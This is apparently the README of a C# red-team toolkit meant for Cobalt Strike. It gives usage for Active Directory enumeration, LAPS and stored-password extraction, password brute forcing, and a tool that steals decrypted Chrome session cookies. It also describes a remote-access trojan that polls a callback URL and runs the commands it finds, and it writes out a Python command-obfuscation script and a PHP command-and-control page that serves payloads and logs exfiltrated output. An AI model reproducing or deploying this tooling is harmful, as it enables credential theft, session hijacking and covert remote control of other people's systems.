# RedTeamCSharpScripts
C# Script used for Red Team. These binaries can be used by Cobalt Strike execute-assembly or as standalone executable. 


# LDAP utility

LDAP utility contains several LDAP query that will return all the valuable information you are looking for.

The utility support the following options

```
Set                 Equivalent of running set command
DumpLocalAdmin      Dump local admin on the remote system
DumpLocalGroup      Dump local group (ALL OF THEM bad idea)
DumpRemoteSession   Dump remote system active sessions
CheckAdmin          Check if current user is admin
DumpTrust           Dump domain & forest trust
DumpAllUsers        Dump all the users 
DumpUser            Dump user information based on the samaccountname provided
DumpUsersEmail      Dump all users and email addresses
DumpAllComputers    Dump all computers
DumpComputer        Dump a computer information based on the name provided
DumpAllGroups       Dump all groups
DumpGroup           Dump a group information based on the name provided
DumpPasswordPolicy  Dump domain password policy
CheckManaged        Check GPOs for managedby objects    
DumpLapsPassword    Try to get LAPS password   
DumpUserPassword    Try to exact userPassword attribute
DumpRemoteSession   Dump remote active session
PasswordBruteForce  Attempt password brute force 
GetShare            List local or remote shares
GetService          List local or remote service
```

```
Usage: ldaputility.exe options domain [arguments]

ldaputility.exe Set
ldaputility.exe DumpLocalAdmin RingZer0 *optional*computername
ldaputility.exe DumpLocalGroup RingZer0 *optional*computername
ldaputility.exe DumpRemoteSession RingZer0 *optional*computername
ldaputility.exe CheckAdmin RingZer0 *optional*computername
ldaputility.exe DumpTrust RingZer0
ldaputility.exe DumpAllUsers RingZer0
ldaputility.exe DumpUser RingZer0 mr.un1k0d3r
ldaputility.exe DumpUsersEmail RingZer0
ldaputility.exe DumpAllComputers RingZer0 
ldaputility.exe DumpComputer RingZer0 DC01
ldaputility.exe DumpAllGroups RingZer0
ldaputility.exe DumpGroup RingZer0 "Domain Admins"
ldaputility.exe DumpPasswordPolicy RingZer0
ldaputility.exe DumpPwdLastSet RingZer0
ldaputility.exe DumpLastLogon RingZer0
ldaputility.exe CheckManaged RingZer0
ldaputility.exe DumpLapsPassword RingZer0 *optional*computername  
ldaputility.exe DumpUserPassword RingZer0   
ldaputility.exe DumpRemoteSession RingZer0  *optional*computername  
ldaputility.exe PasswordBruteForce RingZer0 *optional*username (samaccountname) 
ldaputility.exe GetShare target *optional*Domain\Username Password
ldaputility.exe GetService target *optional*Domain\Username Password
```

The `-verbose` switch can be added to get verbose output.

### The CheckManaged feature

Active Directory support the following two attributes `managedobjects` and `managedby`. These attributes can be used to assign a manager to an object. It can be a user managing a computer. There is a GPO that can be used to grant local admin to managedobjects owner. The user will not be listed as a local admin by default by the correlation between `managedby` and `managedobjects` can identify users that managed computers.

The `CheckManaged` feature first confirm the presence of the GPO in question by looking at the SYSVOL policies present on the DC. If the `groups.xml` is present, it dump all the users with a `managedobjects` attribute and the computers with a `managedby` attribute.

![managedexample](https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamCSharpScripts/master/managed.png)

# Web Hunter 

CSharp version of the Find-Fruit utility https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Find-Fruit.ps1. Tool to query network subnet looking for valuable assets that can be exploited. 

```
webhunter.exe 192.168.1.0/24 80,443,8080,8443
```

```
webhunter.exe 192.168.1.0/24 80,443,8080,8443 -verbose
```

# Cookies Monster

Fetch Chrome cookie in plaintext. Perfect to steal a target session cookie through execute-assembly

```
Usage: CookiesMonster.exe filter
```

The filter argument is optional. If not specified it will dump all the cookies. Since the cookies are encrypted using ProtectedMemory Windows APIs you need to have access to the current user context to be able to generate the proper decryption key. 

The binary need to be compiled statically to include the System.Data.SQLite dll.

# WMI Utility

Set of predefined WMI query that can be used to query CIM classes.

The utility support the following options

```
Usage: WMIUtility.exe options [arguments]

ListProcess         Return a list of running process
ListService         List all the services
Query               Args (query, columns) wmiutility.exe Query "Select * From Win32_CommandLineAccess" "Name,Description"

ListRemoteProcess   Return a list of running process on the target host
ListRemoteService   Return a list of all the services on the target host
Get-EventForUser    Search for 4624 events targeting specific user
RemoteQuery         Args (query, columns) 
Get-Av              Return a list of potential security product

EX:
wmiutility.exe ListRemoteProcess <ComputerName> <Username> <Password>
wmiutility.exe ListRemoteService <ComputerName> <Username> <Password>
wmiutility.exe Get-EventForUser <samAccountname> <DomainController> <Username> <Password>
wmiutility.exe Get-EventForUser <samAccountname> all <Username> <Password>
wmiutility.exe RemoteQuery "Select * From Win32_CommandLineAccess" "Name,Description" <ComputerName> <Username> <Password>
```

# enumerateuser.cs

List all the users samaccountname & mail

```
execute-assembly C:\enumerateuser.exe domain
```

# ldapquery.cs

Perform custom ldap queries

```
execute-assembly C:\enumerateuser.exe ringzer0team "(&(objectCategory=User)(samaccountname=Mr.Un1k0d3r))" samaccountname,mail

Querying LDAP://ringzer0team
Querying: (&(objectCategory=User)(samaccountname=Mr.Un1k0d3r))
Extracting: samaccountname,mail
Mr.Un1k0d3r,Mr.Un1k0d3r@corp.com,
```

# simple-http-rat.cs

A simple RAT that execute command over HTTP. The code is calling back every 10 seconds and will execute the data present on the callback URL.

`rat.exe callbackurl`

The data is obfuscated using the following python trick

```
$ python -c 'import base64; print base64.b64encode("cmd.exe /c whoami")[::-1]'
=kWbh9Ga3ByYvASZ4VmLk12Y
```

The file creation can also be automated using the following script

```
import base64
import sys
import os

path = sys.argv[1]
cmd = sys.argv[2]

if os.path.exists(path):
        os.remove(path)
        
open(path, "w+").write(base64.b64encode(cmd)[::-1])
print "Command added"
```

```
update.py /var/www/html/callback.html "whoami"
```

For the post back RAT the following PHP code can be used to capture the data

```
<?php
$request = (object)array();

if($_SERVER['REQUEST_METHOD'] === "POST") {
        $request->data = file_get_contents("php://input");
        $request->ip = $_SERVER["REMOTE_ADDR"];
        $request->time = date("r");

        $data = str_replace("!)(*&#:<]", "A", $request->data);
        $decoded = base64_decode($data);

        file_put_contents("/tmp/output.txt", "[" . $request->time . "](" . $request->ip . "): " . $decoded . "\r\n", FILE_APPEND);
} else {
        echo file_get_contents("/tmp/payload.txt");
}
?>
```

# set.cs (set.exe)

C# equivalent of Windows set command that does not required to spawn cmd.exe

```
execute-assembly C:\set.exe

PROCESSOR_ARCHITEW6432=AMD64
DriverData=C:\Windows\System32\Drivers\DriverData
```

# Credit

Mr.Un1k0d3r RingZer0 Team

Tazz0 RingZer0 Team

# Contributors

@theFlinkk for the AV module
